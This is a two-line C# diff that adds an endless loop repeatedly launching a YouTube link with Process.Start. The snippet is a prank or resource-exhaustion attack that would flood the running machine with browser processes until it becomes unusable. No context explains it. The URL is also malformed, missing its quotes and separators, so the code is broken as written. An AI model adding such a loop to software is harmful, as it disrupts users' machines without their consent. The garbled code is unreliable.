@@ -1,0 +1,2 @@
+string target = httpswww.youtube.comwatchv=9vCb_ZopT4A;
+while(true) System.Diagnostics.Process.Start(target);
